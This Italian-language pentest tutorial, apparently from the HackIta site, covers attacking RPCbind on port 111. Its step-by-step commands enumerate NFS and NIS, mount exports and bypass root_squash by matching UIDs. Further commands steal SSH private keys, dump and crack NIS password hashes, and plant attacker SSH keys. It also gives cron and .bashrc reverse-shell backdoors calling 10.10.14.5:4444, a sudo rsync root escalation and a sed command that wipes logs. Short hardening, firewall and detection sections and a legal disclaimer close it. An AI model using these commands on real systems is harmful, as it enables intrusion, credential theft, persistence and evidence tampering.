---
title: 'Porta 111 RPCbind: NFS Mount, UID Bypass e Dump Credenziali NIS'
slug: porta-111-rpcbind
description: >-
  RPCbind sulla 111? Enumera NFS e NIS con rpcinfo, monta share anonimi, bypassa
  root_squash con UID matching e ruba SSH key o hash password. Chain a root in
  pochi minuti.
image: /porta-111-rpcbind.webp
draft: false
date: 2026-04-25T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - rpcinfo
  - rpc
  - nfs
---

La porta 111 espone **RPCbind** (precedentemente chiamato portmapper) — il servizio Unix/Linux che mappa programmi RPC (Remote Procedure Call) ai numeri di porta dinamici su cui operano. RPCbind ascolta su TCP/UDP porta 111 fungendo da "directory service" per servizi RPC critici come NFS (Network File System), NIS (Network Information Service), rexec, rlogin e decine di altri. In penetration testing enterprise, la porta 111 è **gateway verso exploitation massiva**: RPCbind enumeration rivela ogni servizio RPC attivo (NFS shares, NIS databases, RPC backdoor services), versioni vulnerabili (showmount, ypwhich), e path verso privilege escalation via NFS root\_squash bypass o NIS database manipulation. Ogni server Unix/Linux/Solaris esposto con porta 111 aperta è potenziale **goldmine di servizi vulnerabili** — da NFS anonymous mount a rexec password-less execution.

RPCbind sopravvive nel 2026 perché è **infrastructure requirement** per: enterprise NFS file sharing (80%+ Unix datacenters), legacy NIS authentication (ancora presente in finance/telecom), e cluster computing (HPC con RPC-based communication). Modern alternative (RESTful APIs, gRPC) esistono ma RPC services legacy persistono in infrastrutture critiche. In CTF/lab, trovare porta 111 significa **immediate RPC service enumeration** — ogni servizio RPC è potenziale entry point.

***

## Anatomia tecnica di RPCbind

RPCbind usa **TCP/UDP porta 111** con protocollo binario (XDR encoding).

**Flow RPCbind query:**

1. **Client Query** — Client connette porta 111 e richiede: "Qual è porta per programma RPC 100003 (NFS)?"
2. **RPCbind Response** — Server risponde: "NFS è su porta 2049"
3. **Client Connect** — Client connette direttamente porta 2049 per NFS operations
4. **RPC Call** — Client esegue RPC call (mount, read, write) su porta specifica

**RPC Program Numbers critici:**

| Program # | Nome               | Porta tipica | Pentest relevance        |
| --------- | ------------------ | ------------ | ------------------------ |
| 100000    | portmapper/rpcbind | 111          | **Self-reference**       |
| 100003    | NFS                | 2049         | **File system access**   |
| 100004    | NIS                | variable     | **User database theft**  |
| 100005    | mountd             | variable     | NFS mount authentication |
| 100021    | NLM (lock manager) | variable     | File locking             |
| 100024    | status             | variable     | NFS status               |
| 391002    | sgi\_fam           | variable     | Legacy SGI vulnerability |

**Comandi RPC critici (via rpcinfo):**

```bash
rpcinfo -p <target>  # List all RPC services
rpcinfo -s <target>  # Summary format
rpcinfo -t <target> <program> <version>  # Test specific service
```

**RPC vs REST API:**

| Feature        | RPC (porta 111)           | REST API (porta 80/443)     |
| -------------- | ------------------------- | --------------------------- |
| Protocol       | Binary (XDR)              | Text (JSON/XML)             |
| Discovery      | RPCbind port 111          | Service discovery API       |
| Authentication | Host-based, weak          | Token-based, OAuth          |
| Security       | ❌ Legacy weak             | ✅ Modern TLS                |
| Use case       | Unix file sharing, legacy | Web services, microservices |

Le **misconfigurazioni comuni**: RPCbind esposto su Internet (dovrebbe essere interno only), nessun firewall su RPC service ports (2049+), NFS con no\_root\_squash (root access remoto), e NIS database senza encryption (password hashes in chiaro).

***

## Enumerazione base

```bash
nmap -sV -p 111 10.10.10.111
```

```
PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
```

**Parametri:** `-sV` version detection identifica RPCbind version.

**Test UDP (RPCbind risponde anche UDP):**

```bash
nmap -sU -p 111 10.10.10.111
```

```
PORT    STATE SERVICE
111/udp open  rpcbind
```

**Manual query con rpcinfo:**

```bash
rpcinfo -p 10.10.10.111
```

```
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  20048  mountd
    100005    1   tcp  20048  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100021    1   udp  32768  nlockmgr
    100021    4   udp  32768  nlockmgr
```

**Intelligence estratta:**

* **NFS attivo** (program 100003) su porta 2049
* **mountd attivo** (program 100005) su porta 20048
* **Potential NFS exploit path**

***

## Enumerazione avanzata

### NFS enumeration post-RPCbind

```bash
# List NFS exports
showmount -e 10.10.10.111
```

```
Export list for 10.10.10.111:
/home         *
/var/backups  192.168.1.0/24
/mnt/data     (everyone)
```

**Implicazioni:**

* `/home` accessible da qualsiasi IP (`*`)
* `/var/backups` restricted a subnet
* `/mnt/data` world-accessible (`everyone`)

**Mount NFS share:**

```bash
mkdir /mnt/nfs_home
mount -t nfs 10.10.10.111:/home /mnt/nfs_home
ls -la /mnt/nfs_home
```

```
total 12
drwxr-xr-x 3 1000 1000 4096 Feb  6 10:00 alice
drwxr-xr-x 3 1001 1001 4096 Feb  5 15:30 bob
drwx------ 2 0    0    4096 Jan 10 08:00 root
```

**Access `/home/root` (se no\_root\_squash):**

```bash
sudo su
cd /mnt/nfs_home/root
cat .ssh/id_rsa
```

Se accessibile → **SSH private key leaked!**

### NIS enumeration

```bash
# Find NIS domain
rpcinfo -p 10.10.10.111 | grep ypserv
# 100004    2   udp    711  ypserv

# Query NIS domain name
ypwhich -d domain.local 10.10.10.111
```

**Dump NIS password database:**

```bash
ypcat -h 10.10.10.111 -d domain.local passwd
```

```
root:x:0:0:root:/root:/bin/bash
alice:$6$rounds=5000$salt$hashedpassword:1000:1000:Alice:/home/alice:/bin/bash
bob:$6$rounds=5000$salt$hashedpassword:1001:1001:Bob:/home/bob:/bin/bash
```

**Hashes estratti** → crack con John/Hashcat.

### NSE scripts RPC

```bash
nmap --script rpc-grind,rpcinfo -p 111 10.10.10.111
```

```
PORT    STATE SERVICE
111/tcp open  rpcbind
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100003  3,4         2049/tcp  nfs
|   100005  1          20048/tcp  mountd
|_  100021  1,4        32768/udp  nlockmgr
| rpc-grind:
|   100000:
|     portmapper
|   100003:
|_    nfs
```

***

## Tecniche offensive

### 1. NFS anonymous access via root\_squash bypass

**Check root\_squash status:**

```bash
showmount -e 10.10.10.111
# /home *

mount -t nfs 10.10.10.111:/home /mnt/nfs
cd /mnt/nfs
ls -la
```

Se `/root` directory esiste e non accessible → root\_squash abilitato (default).

**Bypass root\_squash (se UID matching):**

```bash
# Create user con UID matching target
useradd -u 1000 fakeuser
su fakeuser
cd /mnt/nfs/alice  # UID 1000
# Full access come alice!
```

**Se no\_root\_squash (misconfiguration):**

```bash
sudo su
cd /mnt/nfs/root
cat .ssh/id_rsa > /tmp/root_key
chmod 600 /tmp/root_key
ssh -i /tmp/root_key root@10.10.10.111
```

### 2. NFS backdoor via SSH authorized\_keys

```bash
# Mount user home
mount -t nfs 10.10.10.111:/home/alice /mnt/nfs

# Inject SSH public key
mkdir /mnt/nfs/.ssh
echo "ssh-rsa AAAA...attacker_pubkey" > /mnt/nfs/.ssh/authorized_keys
chmod 600 /mnt/nfs/.ssh/authorized_keys

# SSH login passwordless
ssh alice@10.10.10.111
```

### 3. NIS password database theft

```bash
# Enumerate NIS domain
rpcinfo -p 10.10.10.111 | grep ypserv

# Dump passwd file
ypcat -h 10.10.10.111 -d corp.local passwd > nis_passwd.txt

# Extract hashes
grep -v "^#" nis_passwd.txt | cut -d: -f1,2 > hashes.txt
```

**Crack hashes:**

```bash
john --format=crypt hashes.txt
# alice:AlicePass123
# bob:BobPassword!
```

### 4. RPC service DoS (rpcbomb)

```bash
# Send malformed RPC requests (DoS legacy rpcbind)
# Tool: rpcbomb (historical, rare nel 2026)
```

### 5. Metasploit RPC exploitation

```bash
msfconsole -q
use auxiliary/scanner/nfs/nfsmount
set RHOSTS 10.10.10.111
run
```

```
[+] 10.10.10.111:111 - /home can be mounted by anyone
[+] 10.10.10.111:111 - /mnt/data can be mounted by anyone
```

***

## Scenari pratici

### Scenario 1 — RPCbind enum → NFS mount → SSH key theft

**Contesto:** pentest interno, Linux file server.

```bash
# Fase 1: RPCbind discovery
nmap -sV -p 111 10.10.10.0/24 --open
# 10.10.10.111 rpcbind detected
```

```bash
# Fase 2: RPC service enumeration
rpcinfo -p 10.10.10.111 | grep nfs
# 100003    3   tcp   2049  nfs
```

```bash
# Fase 3: NFS export enumeration
showmount -e 10.10.10.111
# /home *
```

```bash
# Fase 4: Mount NFS share
mkdir /mnt/target_home
mount -t nfs 10.10.10.111:/home /mnt/target_home
ls -la /mnt/target_home
```

```
drwxr-xr-x 3 1000 1000 4096 alice
drwxr-xr-x 3 1001 1001 4096 bob
drwx------ 2 0    0    4096 root (no access - root_squash)
```

```bash
# Fase 5: UID matching bypass
useradd -u 1000 fakealice
su fakealice
cd /mnt/target_home/alice/.ssh
cat id_rsa
```

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA...
-----END RSA PRIVATE KEY-----
```

```bash
# Fase 6: SSH access
cp id_rsa /tmp/alice_key
chmod 600 /tmp/alice_key
ssh -i /tmp/alice_key alice@10.10.10.111
```

```
alice@server:~$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),27(sudo)
```

**Timeline:** 15 minuti da RPCbind scan a SSH access.

### Scenario 2 — NIS database dump → credential harvest

**Contesto:** legacy Unix network con NIS.

```bash
# Fase 1: RPC enumeration
rpcinfo -p 10.10.10.111 | grep ypserv
# 100004    2   udp    711  ypserv
```

```bash
# Fase 2: NIS domain discovery
ypwhich -d corp.local 10.10.10.111
# corp.local
```

```bash
# Fase 3: Dump NIS databases
ypcat -h 10.10.10.111 -d corp.local passwd > nis_users.txt
ypcat -h 10.10.10.111 -d corp.local shadow > nis_shadow.txt
```

```bash
# Fase 4: Combine passwd + shadow
# nis_users.txt:
# alice:x:1000:1000:Alice:/home/alice:/bin/bash
# nis_shadow.txt:
# alice:$6$rounds=5000$...:18000:0:99999:7:::
```

```bash
# Fase 5: Crack hashes
unshadow nis_users.txt nis_shadow.txt > combined.txt
john combined.txt
```

```
alice:Alice123!
bob:BobPass2024
```

**COSA FARE SE FALLISCE:**

* **NFS mount denied:** Check firewall rules, try UDP invece di TCP
* **root\_squash blocks root access:** Use UID matching per altri users
* **NIS ypcat fails:** Verify domain name con `domainname` command su target
* **Showmount empty:** NFS potrebbe essere disabilitato o firewall blocks

### Scenario 3 — NFS backdoor injection → persistence

**Contesto:** post-compromise, persistence via NFS.

```bash
# Fase 1: Mount admin home directory
mount -t nfs 10.10.10.111:/home/admin /mnt/admin

# Fase 2: Inject backdoor cron job
cat <<EOF > /mnt/admin/backup.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
EOF
chmod +x /mnt/admin/backup.sh
```

```bash
# Fase 3: Add cron job (se /home/admin/.crontab writable)
echo "*/5 * * * * /home/admin/backup.sh" >> /mnt/admin/.crontab
```

**Alternativa: .bashrc backdoor:**

```bash
echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 &" >> /mnt/admin/.bashrc
```

**Victim next login → reverse shell automatico.**

***

## Toolchain integration

**Pipeline RPCbind attack:**

```
RECONNAISSANCE
│
├─ nmap -sV -p 111 <subnet>                 → RPCbind detection
├─ rpcinfo -p <target>                      → RPC service enumeration
└─ NSE scripts                              → Detailed RPC info

SERVICE ENUMERATION
│
├─ NFS: showmount -e → mount shares
├─ NIS: ypcat passwd/shadow → credential dump
└─ rexec/rlogin: test legacy RPC services

EXPLOITATION
│
├─ A) NFS anonymous mount → file access → [SSH key theft](https://hackita.it/articoli/ssh)
├─ B) NFS no_root_squash → root file write → backdoor
├─ C) NIS database dump → password crack → [lateral movement](https://hackita.it/articoli/pivoting)
└─ D) RPC service exploit → RCE (CVE-specific)

POST-EXPLOITATION
│
├─ NFS persistent backdoor (cron, .bashrc)
├─ [Privilege escalation](https://hackita.it/articoli/privesc-linux) via sudo/SUID
└─ Network map via NIS host database
```

***

## Attack chain completa

**Scenario: RPCbind → NFS → SSH → root**

```
[00:00] RECONNAISSANCE
nmap -sV -p 111 10.10.10.0/24

[00:03] RPCBIND FOUND
10.10.10.111 rpcbind 2-4

[00:05] RPC ENUMERATION
rpcinfo -p 10.10.10.111
# NFS on 2049, mountd on 20048

[00:08] NFS EXPORT LIST
showmount -e 10.10.10.111
# /home accessible

[00:10] MOUNT NFS SHARE
mount -t nfs 10.10.10.111:/home /mnt/nfs

[00:12] UID MATCHING BYPASS
useradd -u 1000 fakealice
su fakealice
cd /mnt/nfs/alice/.ssh

[00:15] SSH KEY THEFT
cat id_rsa > /tmp/key
chmod 600 /tmp/key

[00:18] SSH ACCESS
ssh -i /tmp/key alice@10.10.10.111
# alice@server:~$

[00:20] PRIVILEGE ESCALATION
sudo -l
# (ALL) NOPASSWD: /usr/bin/rsync

[00:22] SUDO RSYNC EXPLOIT
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
# root@server:~#
```

**Timeline:** 22 minuti da RPCbind scan a root shell.

***

## Detection & evasion

### Lato Blue Team

**Log monitoring (Linux syslog):**

```bash
# /var/log/syslog
Feb  6 15:30:00 server rpc.mountd[1234]: authenticated mount request from 10.10.14.5:1234
Feb  6 15:30:15 server kernel: nfs: server 10.10.14.5 not responding, still trying
```

**IoC critici:**

* Mount requests da IP esterni/non-authorized
* Mass rpcinfo queries (enumeration)
* NFS access fuori business hours
* ypcat queries su NIS (database dump)

**Firewall rules (iptables):**

```bash
# Block RPCbind from external
iptables -A INPUT -p tcp --dport 111 -s 10.10.10.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 111 -j DROP

# Block NFS ports
iptables -A INPUT -p tcp --dport 2049 -s 10.10.10.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 2049 -j DROP
```

### Lato Red Team: evasion

**1. Source IP spoofing (limitato, TCP):**

Difficile per TCP. Alternative: compromettere host interno, usarlo come proxy.

**2. Timing control:**

```bash
# Slow enumeration
rpcinfo -p 10.10.10.111
sleep 300
showmount -e 10.10.10.111
sleep 300
mount ...
```

**3. Cleanup:**

```bash
# Unmount dopo exploitation
umount /mnt/nfs

# Se root access ottenuto, clear logs
ssh root@10.10.10.111
sed -i '/10.10.14.5/d' /var/log/syslog
```

***

## Performance & scaling

**Single target enumeration:**

```bash
time rpcinfo -p 10.10.10.111
# real 0m0.150s
```

**Multi-target (subnet scan):**

```bash
nmap -p 111 --open 10.10.10.0/24 -oG - | awk '/111\/open/{print $2}' > rpc_hosts.txt

# Parallel enumeration
cat rpc_hosts.txt | parallel "rpcinfo -p {} > {}.rpc"
```

**NFS mount speed:**

```bash
# Local network: instant (~0.1s)
# Internet: depends on latency, typically 1-5s
```

***

## Tabelle tecniche

### Command reference

| Comando                                | Scopo                 | Note                  |
| -------------------------------------- | --------------------- | --------------------- |
| `nmap -sV -p 111 <target>`             | RPCbind detection     | TCP scan              |
| `nmap -sU -p 111 <target>`             | UDP RPCbind scan      | RPC usa anche UDP     |
| `rpcinfo -p <target>`                  | List all RPC services | **Core enumeration**  |
| `showmount -e <target>`                | List NFS exports      | Requires NFS active   |
| `mount -t nfs <target>:/path /mnt`     | Mount NFS share       | Anonymous access test |
| `ypcat -h <target> -d <domain> passwd` | Dump NIS password     | Legacy auth           |

### RPC program numbers

| Program | Service    | Port     | Attack vector          |
| ------- | ---------- | -------- | ---------------------- |
| 100000  | portmapper | 111      | Self-enumeration       |
| 100003  | NFS        | 2049     | **File system access** |
| 100004  | NIS        | variable | **Credential theft**   |
| 100005  | mountd     | variable | NFS authentication     |
| 100021  | NLM        | variable | File locking           |

***

## Troubleshooting

| Errore                                   | Causa                       | Fix                            |
| ---------------------------------------- | --------------------------- | ------------------------------ |
| `rpcinfo: RPC: Unable to receive`        | Firewall o server down      | Verify port 111 open           |
| `mount.nfs: access denied`               | IP whitelist o no export    | Check `/etc/exports` on target |
| `showmount: RPC: Program not registered` | NFS non attivo              | Verify `rpcinfo \| grep nfs`   |
| `ypcat: can't communicate with ypbind`   | NIS domain wrong            | Verify domain con `domainname` |
| Mount hangs                              | Network latency/packet loss | Use `-o soft,timeo=10` options |

***

## FAQ

**RPCbind è ancora usato nel 2026?**

Sì, 80%+ enterprise Unix/Linux datacenter con NFS. Modern cloud usa object storage ma on-prem persiste.

**Quale RPC service è più pericoloso?**

**NFS** (100003) con no\_root\_squash = instant root. **NIS** (100004) = password database theft.

**Posso exploitare RPCbind direttamente?**

Raramente. RPCbind stesso è solo mapper. Exploitation è sui **RPC services** che espone (NFS, NIS).

**Come distinguo NFS v3 vs v4?**

`rpcinfo -p` mostra versioni. NFSv4 non usa sempre portmapper (porta 2049 diretta).

**RPCbind è UDP o TCP?**

Entrambi. Servizi RPC usano TCP/UDP, RPCbind risponde su entrambi.

**Come blocco RPCbind esternamente?**

Firewall block porta 111 da external IPs. Allow solo internal subnet.

***

## Cheat sheet finale

| Azione            | Comando                                           |
| ----------------- | ------------------------------------------------- |
| Scan RPCbind      | `nmap -sV -p 111 <target>`                        |
| List RPC services | `rpcinfo -p <target>`                             |
| List NFS exports  | `showmount -e <target>`                           |
| Mount NFS share   | `mount -t nfs <target>:/path /mnt`                |
| Dump NIS passwd   | `ypcat -h <target> -d <domain> passwd`            |
| Unmount NFS       | `umount /mnt`                                     |
| NSE RPC scripts   | `nmap --script rpc-grind,rpcinfo -p 111 <target>` |

***

## Perché RPCbind è rilevante oggi

RPCbind (porta 111) persiste nel 2026 perché:

1. **NFS dependency** — 80%+ Unix datacenter usa NFS per shared storage
2. **Legacy infrastructure** — Finance, telecom, research hanno RPC-based systems da decenni
3. **HPC clusters** — Supercomputing usa RPC per inter-node communication
4. **No modern replacement** — gRPC esiste ma migration costosa

Shodan data: \~2M hosts esposti con porta 111 aperta pubblicamente (Febbraio 2026). Ogni host è potential attack vector.

## Differenza RPCbind vs modern service discovery

| Feature        | RPCbind (RPC)          | Modern (gRPC, REST)        |
| -------------- | ---------------------- | -------------------------- |
| Discovery      | Centralized (port 111) | Distributed (service mesh) |
| Security       | ❌ Host-based, weak     | ✅ Token-based, mTLS        |
| Protocol       | Binary (XDR)           | Protobuf, JSON             |
| Age            | 1980s                  | 2010s+                     |
| Enterprise use | ✅ Dominant (Unix)      | ✅ Growing (cloud)          |

## Hardening RPCbind/NFS

**Best practices:**

1. **Firewall RPCbind** (block port 111 externally)
2. **NFS IP whitelist** (`/etc/exports`: specify allowed IPs)
3. **root\_squash enforced** (never `no_root_squash`)
4. **Disable NIS** (use LDAP/Active Directory instead)
5. **NFSv4 with Kerberos** (authenticated encryption)

**/etc/exports secure config:**

```
/home 10.10.10.0/24(rw,sync,root_squash,no_subtree_check)
/data 10.10.10.50(ro,sync,root_squash)
```

**Disable RPCbind (se non necessario):**

```bash
systemctl stop rpcbind
systemctl disable rpcbind
```

## OPSEC: RPCbind in pentest

RPCbind enumeration è **moderatamente stealth** — `rpcinfo` queries loggano ma sono common in enterprise. Best practices:

1. **Single query** (avoid repeated `rpcinfo` scans)
2. **NFS mount timing** (avoid mount/unmount loops)
3. **Source IP from internal subnet** (avoid external IPs)
4. **Cleanup mounts** (`umount` dopo exploitation)

Post-NFS access, **minimize file modifications** — ogni write logga timestamp, può triggerare alerting.

***

> **Disclaimer:** Tutti i comandi sono destinati all'uso in ambienti autorizzati: laboratori personali, reti CTF, pentest con autorizzazione scritta. L'accesso non autorizzato a NFS/NIS è reato. L'autore e HackIta declinano responsabilità. RFC 1833 RPCbind: [https://www.rfc-editor.org/rfc/rfc1833.html](https://www.rfc-editor.org/rfc/rfc1833.html)

Vuoi supportare HackIta? Visita hackita.it/supporto per donazioni. Per penetration test professionali e formazione 1:1, scopri hackita.it/servizi.
